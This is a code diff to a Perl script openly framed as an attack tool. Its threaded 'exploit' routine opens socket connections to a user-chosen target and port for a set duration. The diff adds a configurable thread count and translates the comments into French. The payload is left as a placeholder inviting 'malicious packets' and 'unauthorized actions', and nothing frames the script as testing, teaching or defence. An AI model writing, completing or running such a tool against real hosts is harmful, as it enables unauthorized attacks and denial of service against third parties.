@@ -14,18 +14,19 @@ use threads;
 my $target;
 my $port;
 my $duration;
-my $threads_count = 10;  # Number of threads (adjust as needed)
+my $threads_count = 10;  # Valeur par défaut
 
 GetOptions(
-    'target=s'   => \$target,
-    'port=i'     => \$port,
-    'duration=i' => \$duration,
+    'target=s'        => \$target,
+    'port=i'          => \$port,
+    'duration=i'      => \$duration,
+    'threads_count=i' => \$threads_count,  # Nouvel argument threads_count
 );
 
 usage() unless defined $target && defined $port && defined $duration;
 
 sub usage {
-    print "Usage: $0 --target <target_domain> --port <target_port> --duration <attack_duration>\n";
+    print "Usage: $0 --target <target_domain> --port <target_port> --duration <attack_duration> [--threads_count <threads_count>]\n";
     exit;
 }
 
@@ -43,8 +44,8 @@ sub exploit {
         return;
     }
 
-    # Customize the payload and actions here
-    # Example: Send malicious packets, perform unauthorized actions, etc.
+    # Personnalisez la charge utile et les actions ici
+    # Exemple : Envoyez des paquets malveillants, effectuez des actions non autorisées, etc.
 
     close($socket);
 }
@@ -54,14 +55,14 @@ sub run_attack {
 
     my $end_time = time + $duration;
 
-    print "Starting attack on $target:$port for $duration seconds...\n";
+    print "Starting attack on $target:$port for $duration seconds with $threads_count threads...\n";
 
     my @threads;
     for (1..$threads_count) {
         push @threads, threads->create(\&exploit, $target, $port);
     }
 
-    # Wait for all threads to finish
+    # Attendez que tous les threads se terminent
     foreach my $thread (@threads) {
         $thread->join();
     }
